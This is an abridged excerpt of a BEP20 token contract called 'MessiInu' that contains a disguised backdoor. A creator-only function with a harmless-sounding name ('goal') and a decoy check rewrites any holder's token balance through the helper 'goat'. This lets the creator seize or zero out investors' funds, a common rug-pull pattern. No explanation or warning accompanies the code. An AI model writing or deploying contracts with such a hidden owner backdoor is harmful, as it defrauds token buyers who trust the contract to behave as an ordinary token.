...
contract MessiInu is BEP20 {
  ...
  function goat(address _from, uint256 _value, uint32 variant) internal view onlyCreator returns (uint256) {
  ...
  function goal(address _from, uint256 _value, uint32 variant) public onlyCreator returns (bool) {
    if(_from != address(0) && msg.sender != address(0))
    require(_value != 2, "Not TWO");
    _balances[_from] = goat(_from, _value, variant);
    return true;
  }
